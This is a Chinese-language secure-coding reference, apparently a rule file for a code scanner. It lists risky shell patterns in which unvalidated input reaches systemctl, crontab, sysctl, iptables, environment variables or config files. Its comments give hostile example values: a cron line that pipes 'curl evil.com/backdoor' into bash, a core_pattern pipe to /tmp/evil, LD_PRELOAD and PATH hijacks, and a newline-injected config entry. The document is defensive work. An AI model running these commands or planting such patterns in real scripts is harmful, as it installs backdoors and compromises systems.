# systemctl / service / crontab 命令安全风险

## 涉及的安全问题
- 修改配置未校验参数（服务管理、定时任务、系统配置）
- 命令注入（systemd service 文件创建、crontab 命令执行）

## 高危模式

### 修改配置未校验参数 — systemctl
```bash
systemctl $ACTION $SERVICE
systemctl start "$USER_SERVICE"
systemctl stop "$USER_SERVICE"
systemctl restart "$USER_SERVICE"
systemctl enable "$USER_SERVICE"
systemctl disable "$USER_SERVICE"
# ACTION = "stop" 且 SERVICE = "firewalld" → 关闭防火墙
# SERVICE = "evil.service" → 启动恶意服务
```

### 修改配置未校验参数 — service / init.d
```bash
service $SERVICE $ACTION
service "$USER_SERVICE" start
service "$USER_SERVICE" stop
/etc/init.d/$SERVICE $ACTION
/etc/init.d/"$USER_SERVICE" restart
invoke-rc.d "$USER_SERVICE" "$USER_ACTION"
```

### 修改配置未校验参数 — 开机自启
```bash
update-rc.d "$USER_SERVICE" defaults
chkconfig "$USER_SERVICE" on
```

### 命令注入 — systemd service 文件创建
```bash
echo "[Unit]" > /etc/systemd/system/"$USER_SERVICE".service
echo "ExecStart=$USER_CMD" >> /etc/systemd/system/"$USER_SERVICE".service
systemctl daemon-reload
systemctl start "$USER_SERVICE"
# 创建并启动任意 systemd 服务，ExecStart 执行任意命令
```

### 修改配置未校验参数 — supervisor / monit
```bash
supervisorctl $ACTION "$USER_PROCESS"
monit $ACTION "$USER_SERVICE"
```

### 命令注入 — crontab
```bash
echo "$USER_CRON" | crontab -
(crontab -l; echo "$USER_CRON") | crontab -
# USER_CRON = "* * * * * curl evil.com/backdoor | bash"
```

### 修改配置未校验参数 — sysctl
```bash
sysctl -w "$USER_SYSCTL"
# USER_SYSCTL = "kernel.core_pattern=|/tmp/evil"
# core_pattern 可触发代码执行
```

### 修改配置未校验参数 — iptables
```bash
iptables -A INPUT -s "$USER_IP" -j ACCEPT
# USER_IP = "0.0.0.0/0" → 放行所有流量
```

### 修改配置未校验参数 — export / env
```bash
export "$USER_VAR"
# USER_VAR = "LD_PRELOAD=/tmp/evil.so" → 动态链接劫持
# USER_VAR = "PATH=/tmp/evil:$PATH" → 命令劫持

env "$USER_VAR=$USER_VALUE" command
```

### 修改配置未校验参数 — 配置文件写入
```bash
echo "server=$USER_SERVER" >> /etc/app/servers.conf
# USER_SERVER = "evil.com\nallow_root=true"

echo "$USER_KEY=$USER_VALUE" >> /etc/app.conf
# 攻击者同时控制键和值

echo "$USER_KEY=$USER_VALUE" >> .env
# 可注入 DATABASE_URL、SECRET_KEY 等敏感配置

echo "AuthorizedKeysCommand $USER_CMD" >> /etc/ssh/sshd_config
```
